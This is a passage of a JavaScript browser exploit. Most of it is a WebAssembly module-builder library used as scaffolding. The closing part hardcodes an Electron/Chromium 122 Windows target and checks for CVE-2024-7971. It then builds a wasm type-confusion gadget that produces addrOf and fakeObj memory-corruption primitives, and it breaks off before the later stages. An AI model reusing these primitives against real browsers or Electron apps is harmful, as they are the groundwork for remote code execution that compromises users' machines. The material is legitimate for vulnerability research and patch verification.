          result.emit_u8(name.charCodeAt(i));
        }
        return result.trunc_buffer()
      }

      createCustomSection(name, bytes) {
        name = this.stringToBytes(name);
        var section = new Binary();
        section.emit_u8(0);
        section.emit_u32v(name.length + bytes.length);
        section.emit_bytes(name);
        section.emit_bytes(bytes);
        return section.trunc_buffer();
      }

      addCustomSection(name, bytes) {
        this.explicit.push(this.createCustomSection(name, bytes));
      }

      addType(type, supertype_idx = kNoSuperType, is_final = true,
              is_shared = false) {
        var pl = type.params.length;
        var rl = type.results.length;
        var type_copy = {params: type.params, results: type.results,
                         is_final: is_final, is_shared: is_shared,
                         supertype: supertype_idx};
        this.types.push(type_copy);
        return this.types.length - 1;
      }

      addLiteralStringRef(str) {
        this.stringrefs.push(str);
        return this.stringrefs.length - 1;
      }

      addStruct(fields, supertype_idx = kNoSuperType, is_final = false,
                is_shared = false) {
        this.types.push(
            new WasmStruct(fields, is_final, is_shared, supertype_idx));
        return this.types.length - 1;
      }

      addArray(type, mutability, supertype_idx = kNoSuperType, is_final = false,
               is_shared = false) {
        this.types.push(
            new WasmArray(type, mutability, is_final, is_shared, supertype_idx));
        return this.types.length - 1;
      }

      addCont(type) {
        let type_index = (typeof type) == 'number' ? type : this.addType(type);
        this.types.push(new WasmCont(type_index));
        return this.types.length - 1;
      }


      nextTypeIndex() { return this.types.length; }

      static defaultFor(type) {
        switch (type) {
          case kWasmI32:
            return wasmI32Const(0);
          case kWasmI64:
            return wasmI64Const(0);
          case kWasmF32:
            return wasmF32Const(0.0);
          case kWasmF64:
            return wasmF64Const(0.0);
          case kWasmS128:
            return [kSimdPrefix, kExprS128Const, ...(new Array(16).fill(0))];
          case kWasmStringViewIter:
          case kWasmStringViewWtf8:
          case kWasmStringViewWtf16:
            throw new Error("String views are non-defaultable");
          default:
            if ((typeof type) != 'number' && type.opcode != kWasmRefNull) {
              throw new Error("Non-defaultable type");
            }
            let heap_type = (typeof type) == 'number' ? type : type.heap_type;
            return [kExprRefNull, ...wasmSignedLeb(heap_type, kMaxVarInt32Size)];
        }
      }

      addGlobal(type, mutable, shared, init) {
        if (init === undefined) init = WasmModuleBuilder.defaultFor(type);
        checkExpr(init);
        let glob = new WasmGlobalBuilder(this, type, mutable, shared, init);
        glob.index = this.globals.length + this.num_imported_globals;
        this.globals.push(glob);
        return glob;
      }

      addTable(
          type, initial_size, max_size = undefined, init_expr = undefined,
          is_shared = false, is_table64 = false) {
        if (type == kWasmI32 || type == kWasmI64 || type == kWasmF32 ||
            type == kWasmF64 || type == kWasmS128 || type == kWasmVoid) {
          throw new Error('Tables must be of a reference type');
        }
        if (init_expr != undefined) checkExpr(init_expr);
        let table = new WasmTableBuilder(
            this, type, initial_size, max_size, init_expr, is_shared, is_table64);
        table.index = this.tables.length + this.num_imported_tables;
        this.tables.push(table);
        return table;
      }

      addTable64(
          type, initial_size, max_size = undefined, init_expr = undefined,
          is_shared = false) {
        return this.addTable(
            type, initial_size, max_size, init_expr, is_shared, true);
      }

      addTag(type) {
        let type_index = (typeof type) == 'number' ? type : this.addType(type);
        let tag_index = this.tags.length + this.num_imported_tags;
        this.tags.push(type_index);
        return tag_index;
      }

      addFunction(name, type, arg_names) {
        arg_names = arg_names || [];
        let type_index = (typeof type) == 'number' ? type : this.addType(type);
        let num_args = this.types[type_index].params.length;
        if (num_args < arg_names.length) {
          throw new Error('too many arg names provided');
        }
        if (num_args > arg_names.length) {
          arg_names.push(num_args - arg_names.length);
        }
        let func = new WasmFunctionBuilder(this, name, type_index, arg_names);
        func.index = this.functions.length + this.num_imported_funcs;
        this.functions.push(func);
        return func;
      }

      addImport(module, name, type, kind = kExternalFunction) {
        if (this.functions.length != 0) {
          throw new Error('Imported functions must be declared before local ones');
        }
        let type_index = (typeof type) == 'number' ? type : this.addType(type);
        this.imports.push({module, name, kind, type_index});
        return this.num_imported_funcs++;
      }

      addImportedGlobal(module, name, type, mutable = false, shared = false) {
        if (this.globals.length != 0) {
          throw new Error('Imported globals must be declared before local ones');
        }
        let kind = kExternalGlobal;
        let o = {module, name, kind, type, mutable, shared};
        this.imports.push(o);
        return this.num_imported_globals++;
      }

      addImportedMemory(module, name, initial = 0, maximum, shared, is_memory64) {
        if (this.memories.length !== 0) {
          throw new Error(
              'Add imported memories before declared memories to avoid messing ' +
              'up the indexes');
        }
        let mem_index = this.imports.filter(i => i.kind == kExternalMemory).length;
        let kind = kExternalMemory;
        shared = !!shared;
        is_memory64 = !!is_memory64;
        let o = {module, name, kind, initial, maximum, shared, is_memory64};
        this.imports.push(o);
        return mem_index;
      }

      addImportedTable(
          module, name, initial, maximum, type = kWasmFuncRef, shared = false,
          is_table64 = false) {
        if (this.tables.length != 0) {
          throw new Error('Imported tables must be declared before local ones');
        }
        let o = {
          module,
          name,
          kind: kExternalTable,
          initial,
          maximum,
          type,
          shared: !!shared,
          is_table64: !!is_table64,
        };
        this.imports.push(o);
        return this.num_imported_tables++;
      }

      addImportedTag(module, name, type) {
        if (this.tags.length != 0) {
          throw new Error('Imported tags must be declared before local ones');
        }
        let type_index = (typeof type) == 'number' ? type : this.addType(type);
        let kind = kExternalTag;
        let o = {module, name, kind, type_index};
        this.imports.push(o);
        return this.num_imported_tags++;
      }

      addExport(name, index) {
        this.exports.push({name: name, kind: kExternalFunction, index: index});
        return this;
      }

      addExportOfKind(name, kind, index) {
        if (index === undefined && kind != kExternalTable &&
            kind != kExternalMemory) {
          throw new Error(
              'Index for exports other than tables/memories must be provided');
        }
        if (index !== undefined && (typeof index) != 'number') {
          throw new Error('Index for exports must be a number')
        }
        this.exports.push({name: name, kind: kind, index: index});
        return this;
      }

      addActiveDataSegment(memory_index, offset, data, is_shared = false) {
        checkExpr(offset);
        this.data_segments.push({
          is_active: true,
          is_shared: is_shared,
          mem_index: memory_index,
          offset: offset,
          data: data
        });
        return this.data_segments.length - 1;
      }

      addPassiveDataSegment(data, is_shared = false) {
        this.data_segments.push({
          is_active: false, is_shared: is_shared, data: data});
        return this.data_segments.length - 1;
      }

      exportMemoryAs(name, memory_index) {
        if (memory_index === undefined) {
          const num_memories = this.memories.length +
              this.imports.filter(i => i.kind == kExternalMemory).length;
          if (num_memories !== 1) {
            throw new Error(
                'Pass memory index to \'exportMemoryAs\' if there is not exactly ' +
                'one memory imported or declared.');
          }
          memory_index = 0;
        }
        this.exports.push({name: name, kind: kExternalMemory, index: memory_index});
      }

      addActiveElementSegment(table, offset, elements, type, is_shared = false) {
        checkExpr(offset);
        if (type != undefined) {
          for (let element of elements) checkExpr(element);
        }
        this.element_segments.push(
            new WasmElemSegment(table, offset, type, elements, false, is_shared));
        return this.element_segments.length - 1;
      }

      addPassiveElementSegment(elements, type, is_shared = false) {
        if (type != undefined) {
          for (let element of elements) checkExpr(element);
        }
        this.element_segments.push(new WasmElemSegment(
          undefined, undefined, type, elements, false, is_shared));
        return this.element_segments.length - 1;
      }

      addDeclarativeElementSegment(elements, type, is_shared = false) {
        if (type != undefined) {
          for (let element of elements) checkExpr(element);
        }
        this.element_segments.push(new WasmElemSegment(
          undefined, undefined, type, elements, true, is_shared));
        return this.element_segments.length - 1;
      }

      appendToTable(array) {
        for (let n of array) {
          if (typeof n != 'number')
            throw new Error('invalid table (entries have to be numbers): ' + array);
        }
        if (this.tables.length == 0) {
          this.addTable(kWasmAnyFunc, 0);
        }
        let table = this.tables[0];
        const base = table.initial_size;
        const table_size = base + array.length;
        table.initial_size = table_size;
        if (table.has_max && table_size > table.max_size) {
          table.max_size = table_size;
        }
        return this.addActiveElementSegment(0, wasmI32Const(base), array);
      }

      setTableBounds(min, max = undefined) {
        if (this.tables.length != 0) {
          throw new Error('The table bounds of table \'0\' have already been set.');
        }
        this.addTable(kWasmAnyFunc, min, max);
        return this;
      }

      startRecGroup() {
        this.rec_groups.push({start: this.types.length, size: 0});
      }

      endRecGroup() {
        if (this.rec_groups.length == 0) {
          throw new Error("Did not start a recursive group before ending one")
        }
        let last_element = this.rec_groups[this.rec_groups.length - 1]
        if (last_element.size != 0) {
          throw new Error("Did not start a recursive group before ending one")
        }
        last_element.size = this.types.length - last_element.start;
      }

      setName(name) {
        this.name = name;
        return this;
      }

      setCompilationPriority(
          function_index, compilation_priority, optimization_priority) {
        this.compilation_priorities.set(function_index, {
          compilation_priority, optimization_priority
        });
      }

      setInstructionFrequencies(function_index, instruction_frequencies) {
        if (!Array.isArray(instruction_frequencies)) {
          throw new Error("instruction_frequencies must be an array");
        }
        this.instruction_frequencies.set(function_index, instruction_frequencies);
      }

      setCallTargets(function_index, call_targets) {
        if (!Array.isArray(call_targets)) {
          throw new Error("call_targets must be an array");
        }
        this.call_targets.set(function_index, call_targets);
      }

      toBuffer(debug = false) {
        let binary = new Binary;
        let wasm = this;

        binary.emit_header();

        if (wasm.types.length > 0) {
          if (debug) print('emitting types @ ' + binary.length);
          binary.emit_section(kTypeSectionCode, section => {
            let length_with_groups = wasm.types.length;
            for (let group of wasm.rec_groups) {
              length_with_groups -= group.size - 1;
            }
            section.emit_u32v(length_with_groups);

            let rec_group_index = 0;

            for (let i = 0; i < wasm.types.length; i++) {
              if (rec_group_index < wasm.rec_groups.length &&
                  wasm.rec_groups[rec_group_index].start == i) {
                section.emit_u8(kWasmRecursiveTypeGroupForm);
                section.emit_u32v(wasm.rec_groups[rec_group_index].size);
                rec_group_index++;
              }

              let type = wasm.types[i];
              if (type.supertype != kNoSuperType) {
                section.emit_u8(type.is_final ? kWasmSubtypeFinalForm
                                              : kWasmSubtypeForm);
                section.emit_u8(1);
                section.emit_u32v(type.supertype);
              } else if (!type.is_final) {
                section.emit_u8(kWasmSubtypeForm);
                section.emit_u8(0);
              }
              if (type.is_shared) section.emit_u8(kWasmSharedTypeForm);
              if (type.describes !== undefined) {
                section.emit_u8(kWasmDescribesTypeForm);
                section.emit_u32v(type.describes);
              }
              if (type.descriptor !== undefined) {
                section.emit_u8(kWasmDescriptorTypeForm);
                section.emit_u32v(type.descriptor);
              }
              if (type instanceof WasmStruct) {
                section.emit_u8(kWasmStructTypeForm);
                section.emit_u32v(type.fields.length);
                for (let field of type.fields) {
                  section.emit_type(field.type);
                  section.emit_u8(field.mutability ? 1 : 0);
                }
              } else if (type instanceof WasmArray) {
                section.emit_u8(kWasmArrayTypeForm);
                section.emit_type(type.type);
                section.emit_u8(type.mutability ? 1 : 0);
              } else if (type instanceof WasmCont) {
                section.emit_u8(kWasmContTypeForm);
                section.emit_u32v(type.type_index);
              } else {
                section.emit_u8(kWasmFunctionTypeForm);
                section.emit_u32v(type.params.length);
                for (let param of type.params) {
                  section.emit_type(param);
                }
                section.emit_u32v(type.results.length);
                for (let result of type.results) {
                  section.emit_type(result);
                }
              }
            }
          });
        }

        if (wasm.imports.length > 0) {
          if (debug) print('emitting imports @ ' + binary.length);
          binary.emit_section(kImportSectionCode, section => {
            section.emit_u32v(wasm.imports.length);
            for (let imp of wasm.imports) {
              section.emit_string(imp.module);
              section.emit_string(imp.name || '');
              section.emit_u8(imp.kind);
              if (imp.kind == kExternalFunction ||
                  imp.kind == kExternalExactFunction) {
                section.emit_u32v(imp.type_index);
              } else if (imp.kind == kExternalGlobal) {
                section.emit_type(imp.type);
                let flags = (imp.mutable ? 1 : 0) | (imp.shared ? 0b10 : 0);
                section.emit_u8(flags);
              } else if (imp.kind == kExternalMemory) {
                const has_max = imp.maximum !== undefined;
                const is_shared = !!imp.shared;
                const is_memory64 = !!imp.is_memory64;
                let limits_byte =
                    (is_memory64 ? 4 : 0) | (is_shared ? 2 : 0) | (has_max ? 1 : 0);
                section.emit_u8(limits_byte);
                let emit = val =>
                    is_memory64 ? section.emit_u64v(val) : section.emit_u32v(val);
                emit(imp.initial);
                if (has_max) emit(imp.maximum);
              } else if (imp.kind == kExternalTable) {
                section.emit_type(imp.type);
                const has_max = (typeof imp.maximum) != 'undefined';
                const is_shared = !!imp.shared;
                const is_table64 = !!imp.is_table64;
                let limits_byte =
                    (is_table64 ? 4 : 0) | (is_shared ? 2 : 0) | (has_max ? 1 : 0);
                section.emit_u8(limits_byte);
                section.emit_u32v(imp.initial);
                if (has_max) section.emit_u32v(imp.maximum);
              } else if (imp.kind == kExternalTag) {
                section.emit_u32v(kExceptionAttribute);
                section.emit_u32v(imp.type_index);
              } else {
                throw new Error('unknown/unsupported import kind ' + imp.kind);
              }
            }
          });
        }

        if (wasm.functions.length > 0) {
          if (debug) print('emitting function decls @ ' + binary.length);
          binary.emit_section(kFunctionSectionCode, section => {
            section.emit_u32v(wasm.functions.length);
            for (let func of wasm.functions) {
              section.emit_u32v(func.type_index);
            }
          });
        }

        if (wasm.tables.length > 0) {
          if (debug) print('emitting tables @ ' + binary.length);
          binary.emit_section(kTableSectionCode, section => {
            section.emit_u32v(wasm.tables.length);
            for (let table of wasm.tables) {
              if (table.has_init) {
                section.emit_u8(0x40);
                section.emit_u8(0x00);
              }
              section.emit_type(table.type);
              let limits_byte = (table.is_table64 ? 4 : 0) |
                  (table.is_shared ? 2 : 0) | (table.has_max ? 1 : 0);
              section.emit_u8(limits_byte);
              let emit = val => table.is_table64 ? section.emit_u64v(val) :
                                                   section.emit_u32v(val);
              emit(table.initial_size);
              if (table.has_max) emit(table.max_size);
              if (table.has_init) section.emit_init_expr(table.init_expr);
            }
          });
        }

        if (wasm.memories.length > 0) {
          if (debug) print('emitting memories @ ' + binary.length);
          binary.emit_section(kMemorySectionCode, section => {
            section.emit_u32v(wasm.memories.length);
            for (let memory of wasm.memories) {
              const has_max = memory.max !== undefined;
              const is_shared = !!memory.shared;
              const is_memory64 = !!memory.is_memory64;
              let limits_byte =
                  (is_memory64 ? 4 : 0) | (is_shared ? 2 : 0) | (has_max ? 1 : 0);
              section.emit_u8(limits_byte);
              let emit = val =>
                  is_memory64 ? section.emit_u64v(val) : section.emit_u32v(val);
              emit(memory.min);
              if (has_max) emit(memory.max);
            }
          });
        }

        if (wasm.tags.length > 0) {
          if (debug) print('emitting tags @ ' + binary.length);
          binary.emit_section(kTagSectionCode, section => {
            section.emit_u32v(wasm.tags.length);
            for (let type_index of wasm.tags) {
              section.emit_u32v(kExceptionAttribute);
              section.emit_u32v(type_index);
            }
          });
        }

        if (wasm.stringrefs.length > 0) {
          if (debug) print('emitting stringrefs @ ' + binary.length);
          binary.emit_section(kStringRefSectionCode, section => {
            section.emit_u32v(0);
            section.emit_u32v(wasm.stringrefs.length);
            for (let str of wasm.stringrefs) {
              section.emit_string(str);
            }
          });
        }

        if (wasm.globals.length > 0) {
          if (debug) print('emitting globals @ ' + binary.length);
          binary.emit_section(kGlobalSectionCode, section => {
            section.emit_u32v(wasm.globals.length);
            for (let global of wasm.globals) {
              section.emit_type(global.type);
              section.emit_u8((global.mutable ? 1 : 0) | (global.shared ? 0b10 : 0));
              section.emit_init_expr(global.init);
            }
          });
        }

        var exports_count = wasm.exports.length;
        if (exports_count > 0) {
          if (debug) print('emitting exports @ ' + binary.length);
          binary.emit_section(kExportSectionCode, section => {
            section.emit_u32v(exports_count);
            for (let exp of wasm.exports) {
              section.emit_string(exp.name);
              section.emit_u8(exp.kind);
              section.emit_u32v(exp.index);
            }
          });
        }

        if (wasm.start_index !== undefined) {
          if (debug) print('emitting start function @ ' + binary.length);
          binary.emit_section(kStartSectionCode, section => {
            section.emit_u32v(wasm.start_index);
          });
        }

        if (wasm.element_segments.length > 0) {
          if (debug) print('emitting element segments @ ' + binary.length);
          binary.emit_section(kElementSectionCode, section => {
            var segments = wasm.element_segments;
            section.emit_u32v(segments.length);

            for (let segment of segments) {
              let shared_flag = segment.is_shared ? 0b1000 : 0;
              if (segment.is_active()) {
                if (segment.table == 0 && segment.type === undefined) {
                  if (segment.expressions_as_elements()) {
                    section.emit_u8(0x04 | shared_flag);
                    section.emit_init_expr(segment.offset);
                  } else {
                    section.emit_u8(0x00 | shared_flag)
                    section.emit_init_expr(segment.offset);
                  }
                } else {
                  if (segment.expressions_as_elements()) {
                    section.emit_u8(0x06 | shared_flag);
                    section.emit_u32v(segment.table);
                    section.emit_init_expr(segment.offset);
                    section.emit_type(segment.type);
                  } else {
                    section.emit_u8(0x02 | shared_flag);
                    section.emit_u32v(segment.table);
                    section.emit_init_expr(segment.offset);
                    section.emit_u8(kExternalFunction);
                  }
                }
              } else {
                if (segment.expressions_as_elements()) {
                  if (segment.is_passive()) {
                    section.emit_u8(0x05 | shared_flag);
                  } else {
                    section.emit_u8(0x07 | shared_flag);
                  }
                  section.emit_type(segment.type);
                } else {
                  if (segment.is_passive()) {
                    section.emit_u8(0x01 | shared_flag);
                  } else {
                    section.emit_u8(0x03 | shared_flag);
                  }
                  section.emit_u8(kExternalFunction);
                }
              }

              section.emit_u32v(segment.elements.length);
              for (let element of segment.elements) {
                if (segment.expressions_as_elements()) {
                  section.emit_init_expr(element);
                } else {
                  section.emit_u32v(element);
                }
              }
            }
          })
        }

        if (wasm.data_segments.some(seg => !seg.is_active)) {
          binary.emit_section(kDataCountSectionCode, section => {
            section.emit_u32v(wasm.data_segments.length);
          });
        }

        if (wasm.functions.length > 0) {
          if (debug) print('emitting code @ ' + binary.length);
          let section_length = 0;
          binary.emit_section(kCodeSectionCode, section => {
            section.emit_u32v(wasm.functions.length);
            let header;
            for (let func of wasm.functions) {
              if (func.locals.length == 0) {
                section.emit_u32v(func.body.length + 1);
                section.emit_u8(0);
              } else {
                if (!header) header = new Binary;
                header.reset();
                header.emit_u32v(func.locals.length);
                for (let decl of func.locals) {
                  header.emit_u32v(decl.count);
                  header.emit_type(decl.type);
                }
                section.emit_u32v(header.length + func.body.length);
                section.emit_bytes(header.trunc_buffer());
              }
              func.body_offset = section.length;
              section.emit_bytes(func.body);
            }
            section_length = section.length;
          });
          for (let func of wasm.functions) {
            func.body_offset += binary.length - section_length;
          }
        }

        if (wasm.data_segments.length > 0) {
          if (debug) print('emitting data segments @ ' + binary.length);
          binary.emit_section(kDataSectionCode, section => {
            section.emit_u32v(wasm.data_segments.length);
            for (let seg of wasm.data_segments) {
              let shared_flag = seg.is_shared ? 0b1000 : 0;
              if (seg.is_active) {
                if (seg.mem_index == 0) {
                  section.emit_u8(kActiveNoIndex | shared_flag);
                } else {
                  section.emit_u8(kActiveWithIndex | shared_flag);
                  section.emit_u32v(seg.mem_index);
                }
                section.emit_init_expr(seg.offset);
              } else {
                section.emit_u8(kPassive | shared_flag);
              }
              section.emit_u32v(seg.data.length);
              section.emit_bytes(seg.data);
            }
          });
        }

        for (let exp of wasm.explicit) {
          if (debug) print('emitting explicit @ ' + binary.length);
          binary.emit_bytes(exp);
        }

        let num_function_names = 0;
        let num_functions_with_local_names = 0;
        for (let func of wasm.functions) {
          if (func.name !== undefined) ++num_function_names;
          if (func.numLocalNames() > 0) ++num_functions_with_local_names;
        }
        if (num_function_names > 0 || num_functions_with_local_names > 0 ||
            wasm.name !== undefined) {
          if (debug) print('emitting names @ ' + binary.length);
          binary.emit_section(kUnknownSectionCode, section => {
            section.emit_string('name');
            if (wasm.name !== undefined) {
              section.emit_section(kModuleNameCode, name_section => {
                name_section.emit_string(wasm.name);
              });
            }
            if (num_function_names > 0) {
              section.emit_section(kFunctionNamesCode, name_section => {
                name_section.emit_u32v(num_function_names);
                for (let func of wasm.functions) {
                  if (func.name === undefined) continue;
                  name_section.emit_u32v(func.index);
                  name_section.emit_string(func.name);
                }
              });
            }
            if (num_functions_with_local_names > 0) {
              section.emit_section(kLocalNamesCode, name_section => {
                name_section.emit_u32v(num_functions_with_local_names);
                for (let func of wasm.functions) {
                  if (func.numLocalNames() == 0) continue;
                  name_section.emit_u32v(func.index);
                  name_section.emit_u32v(func.numLocalNames());
                  let name_index = 0;
                  for (let i = 0; i < func.local_names.length; ++i) {
                    if (typeof func.local_names[i] == 'string') {
                      name_section.emit_u32v(name_index);
                      name_section.emit_string(func.local_names[i]);
                      name_index++;
                    } else {
                      name_index += func.local_names[i];
                    }
                  }
                }
              });
            }
          });
        }

        if (this.compilation_priorities.size > 0) {
          binary.emit_section(kUnknownSectionCode, section => {
            section.emit_string("metadata.code.compilation_priority");
            section.emit_u32v(this.compilation_priorities.size);
            this.compilation_priorities.forEach((priority, index) => {
              section.emit_u32v(index);
              section.emit_u8(0);
              let compilation_priority =
                  wasmUnsignedLeb(priority.compilation_priority);
              let optimization_priority =
                  priority.optimization_priority != undefined ?
                  wasmUnsignedLeb(priority.optimization_priority) :
                  [];
              section.emit_u32v(compilation_priority.length +
                                optimization_priority.length);
              section.emit_bytes(compilation_priority);
              section.emit_bytes(optimization_priority);
            })
          })
        }

        if (this.instruction_frequencies.size > 0) {
          binary.emit_section(kUnknownSectionCode, section => {
            section.emit_string("metadata.code.instr_freq");
            section.emit_u32v(this.instruction_frequencies.size);
            this.instruction_frequencies.forEach((frequencies, index) => {
              section.emit_u32v(index);
              section.emit_u32v(frequencies.length);
              frequencies.forEach(frequency => {
                section.emit_u32v(frequency.offset);
                section.emit_u32v(1);
                section.emit_u8(frequency.frequency);
              })
            })
          })
        }

        if (this.call_targets.size > 0) {
          binary.emit_section(kUnknownSectionCode, section => {
            section.emit_string("metadata.code.call_targets");
            section.emit_u32v(this.call_targets.size);
            this.call_targets.forEach((targets, index) => {
              section.emit_u32v(index);
              section.emit_u32v(targets.length);
              targets.forEach(targets_for_offset => {
                section.emit_u32v(targets_for_offset.offset);
                let hints = targets_for_offset.targets.map(target => {
                  return {
                    function_index: wasmUnsignedLeb(target.function_index),
                    frequency_percent: wasmUnsignedLeb(target.frequency_percent)
                  }
                })
                var hint_length = 0;
                hints.forEach(hint => {
                  hint_length += hint.function_index.length;
                  hint_length += hint.frequency_percent.length;
                });
                section.emit_u32v(hint_length);
                hints.forEach(hint => {
                  section.emit_u32v(hint.function_index);
                  section.emit_u32v(hint.frequency_percent);
                })
              })
            })
          })
        }

        return binary.trunc_buffer();
      }

      toArray(debug = false) {
        return Array.from(this.toBuffer(debug));
      }

      instantiate(ffi, options) {
        let module = this.toModule(options);
        let instance = new WebAssembly.Instance(module, ffi);
        return instance;
      }

      asyncInstantiate(ffi) {
        return WebAssembly.instantiate(this.toBuffer(), ffi)
            .then(({module, instance}) => instance);
      }

      toModule(options, debug = false) {
        return new WebAssembly.Module(this.toBuffer(debug), options);
      }
    }

    function wasmSignedLeb(val, max_len = 5) {
      if (val == null) throw new Error("Leb value may not be null/undefined");
      let res = [];
      for (let i = 0; i < max_len; ++i) {
        let v = val & 0x7f;
        if (((v << 25) >> 25) == val) {
          res.push(v);
          return res;
        }
        res.push(v | 0x80);
        val = val >> 7;
      }
      throw new Error(
          'Leb value <' + val + '> exceeds maximum length of ' + max_len);
    }

    function wasmSignedLeb64(val, max_len = 10) {
      if (val == null) throw new Error("Leb value may not be null/undefined");
      if (typeof val != "bigint") {
        if (val < Math.pow(2, 31)) {
          return wasmSignedLeb(val, max_len);
        }
        val = BigInt(val);
      }
      let res = [];
      for (let i = 0; i < max_len; ++i) {
        let v = val & 0x7fn;
        if (BigInt.asIntN(7, v) == val) {
          res.push(Number(v));
          return res;
        }
        res.push(Number(v) | 0x80);
        val = val >> 7n;
      }
      throw new Error(
          'Leb value <' + val + '> exceeds maximum length of ' + max_len);
    }

    function wasmUnsignedLeb(val, max_len = 5) {
      if (val == null) throw new Error("Leb value many not be null/undefined");
      let res = [];
      for (let i = 0; i < max_len; ++i) {
        let v = val & 0x7f;
        if (v == val) {
          res.push(v);
          return res;
        }
        res.push(v | 0x80);
        val = val >>> 7;
      }
      throw new Error(
          'Leb value <' + val + '> exceeds maximum length of ' + max_len);
    }

    function wasmI32Const(val) {
      return [kExprI32Const, ...wasmSignedLeb(val, 5)];
    }

    function wasmI64Const(val) {
      return [kExprI64Const, ...wasmSignedLeb64(val, 10)];
    }

    function wasmF32Const(f) {
      data_view.setFloat32(0, f, true);
      return [
        kExprF32Const, byte_view[0], byte_view[1], byte_view[2], byte_view[3]
      ];
    }

    function wasmF64Const(f) {
      data_view.setFloat64(0, f, true);
      return [
        kExprF64Const, byte_view[0], byte_view[1], byte_view[2], byte_view[3],
        byte_view[4], byte_view[5], byte_view[6], byte_view[7]
      ];
    }

    function wasmS128Const(f) {
      if (Array.isArray(f)) {
        if (f.length != 16) throw new Error('S128Const needs 16 bytes');
        return [kSimdPrefix, kExprS128Const, ...f];
      }
      let result = [kSimdPrefix, kExprS128Const];
      if (arguments.length === 2) {
        for (let j = 0; j < 2; j++) {
          data_view.setFloat64(0, arguments[j], true);
          for (let i = 0; i < 8; i++) result.push(byte_view[i]);
        }
      } else if (arguments.length === 4) {
        for (let j = 0; j < 4; j++) {
          data_view.setFloat32(0, arguments[j], true);
          for (let i = 0; i < 4; i++) result.push(byte_view[i]);
        }
      } else {
        throw new Error('S128Const needs an array of bytes, or two f64 values, ' +
                        'or four f32 values');
      }
      return result;
    }

    var wasmEncodeHeapType = function(type) {
      let result = wasmSignedLeb(type.heap_type, kMaxVarInt32Size);
      if (type.is_shared) {
        result = [kWasmSharedTypeForm].concat(result);
      }
      if (type.is_exact) {
        result = [kWasmExact].concat(result);
      }
      return result;
    };

    var [wasmBrOnCast, wasmBrOnCastFail, wasmBrOnCastDesc, wasmBrOnCastDescFail] =
    (function() {
      return [
        (labelIdx, sourceType, targetType) =>
          wasmBrOnCastImpl(labelIdx, sourceType, targetType, kExprBrOnCast),
        (labelIdx, sourceType, targetType) =>
          wasmBrOnCastImpl(labelIdx, sourceType, targetType, kExprBrOnCastFail),
        (labelIdx, sourceType, targetType) =>
          wasmBrOnCastImpl(labelIdx, sourceType, targetType, kExprBrOnCastDesc),
        (labelIdx, sourceType, targetType) =>
          wasmBrOnCastImpl(labelIdx, sourceType, targetType, kExprBrOnCastDescFail),
      ];
      function wasmBrOnCastImpl(labelIdx, sourceType, targetType, opcode) {
        labelIdx = wasmUnsignedLeb(labelIdx, kMaxVarInt32Size);
        let srcIsNullable = sourceType.opcode == kWasmRefNull;
        let tgtIsNullable = targetType.opcode == kWasmRefNull;
        flags = (tgtIsNullable << 1) + srcIsNullable;
        return [
          kGCPrefix, opcode, flags, ...labelIdx, ...wasmEncodeHeapType(sourceType),
          ...wasmEncodeHeapType(targetType)
        ];
      }
    })();

    function getOpcodeName(opcode) {
      return globalThis.kWasmOpcodeNames?.[opcode] ?? 'unknown';
    }

    function wasmF32ConstSignalingNaN() {
      return [kExprF32Const, 0xb9, 0xa1, 0xa7, 0x7f];
    }

    function wasmF64ConstSignalingNaN() {
      return [kExprF64Const, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf4, 0x7f];
    }
  }
}

{
    FINGERPRINT.browser.name = "Electron";
    FINGERPRINT.browser.browser_version = {major: 29, minor: 4, build: 6, patch: 0};
    FINGERPRINT.browser.chromium_version = {major: 122, minor: 0, build: 6261, patch: 156};
    FINGERPRINT.platform.arch = "x64";
    FINGERPRINT.platform.bitness = "64";
    FINGERPRINT.platform.os = "Windows";
    FINGERPRINT.platform.os_version = "";
    FINGERPRINT.platform.device = "";
    FINGERPRINT.process.sandboxed = false;
    log("[+] Fingerprint hardcoded: Electron 31.3.1 / Chromium 122.0.6261.156 / Windows x64", 1);
}

try {

{
    let versioncheck = (FINGERPRINT.browser.chromium_version.major <= 127);
    if (!versioncheck)
        log("[-] Target likely not vulnerable to CVE-2024-7971", 1);


    let confuse = (in_type, out_type, null_in, null_out) => {
        const builder = new WasmModuleBuilder();
        let $sig1 = builder.addType(makeSig([], [kWasmF32, kWasmF32, in_type, kWasmFuncRef]));
        let $sig2 = builder.addType(makeSig([out_type, kWasmF32, kWasmF32, in_type, kWasmFuncRef], []));

        let $doit = builder.addImport("js", "doit", $sig2);
        let $global0 = builder.addImportedGlobal("js", "global0", in_type, true);

        builder.addDeclarativeElementSegment([$doit]);
        builder.addFunction("main", kSig_v_v).exportFunc().addBody([
            ...null_out,
            kExprTry, $sig1,
                ...wasmF32Const(0),
                ...wasmF32Const(0),
                ...null_in,
                kExprRefNull, kFuncRefCode,
            kExprEnd,
            kExprLoop, $sig2,
                kExprCallFunction, $doit,
                kExprI64Const, 0,
                kExprI64Const, 0,
                ...null_out,
                ...wasmF32Const(0),
                ...wasmF32Const(0),
                kExprGlobalGet, $global0,
                kExprRefFunc, $doit,
                kExprBr, 0,
            kExprEnd,
        ]);

        return builder;
    }


    const addrof_builder = confuse(kWasmExternRef, kWasmF64, [kExprRefNull, kExternRefCode], wasmF64Const(0));

    function addrOf64(obj) {
        let i = 0;
        function doit(addr, _, _, _, _) {
            if (i >= 1) throw f2bi(addr);
            i++;
        }
        let global0 = new WebAssembly.Global({value: "externref", mutable: true});

        let imports = {"js": {doit, global0}};
        let instance = addrof_builder.instantiate(imports);

        let addr;
        global0.value = obj;
        try {
            instance.exports.main();
        } catch (err) {
            addr = err;
        }

        return addr;
    }

    function addrOf(obj) {
        if (FINGERPRINT.platform.bitness === "32") return Number(addrOf64(obj) >> 4n*8n);
        return Number(addrOf64(obj) & 0xffffffffn);
    }


    var SANDBOX_BASE = 0n;
    const fakeobj_builder = confuse(kWasmF64, kWasmExternRef, wasmF64Const(0), [kExprRefNull, kExternRefCode]);

    function fakeObj64(addr) {
        let i = 0;
        function doit(obj, _, _, _, _) {
            if (i >= 1) throw obj;
            i++;
        }
        let global0 = new WebAssembly.Global({value: "f64", mutable: true});

        let imports = {"js": {doit, global0}};
        let instance = fakeobj_builder.instantiate(imports);

        let fake_obj;
        global0.value = bi2f(addr);
        try {
            instance.exports.main();
        } catch (err) {
            fake_obj = err;
        }

        return fake_obj;
    }

    function fakeObj(addr) {
        if (FINGERPRINT.platform.bitness === "32") return fakeObj64(BigInt(addr));
        return fakeObj64(SANDBOX_BASE + BigInt(addr));
    }


    if (FINGERPRINT.platform.bitness !== "32") {
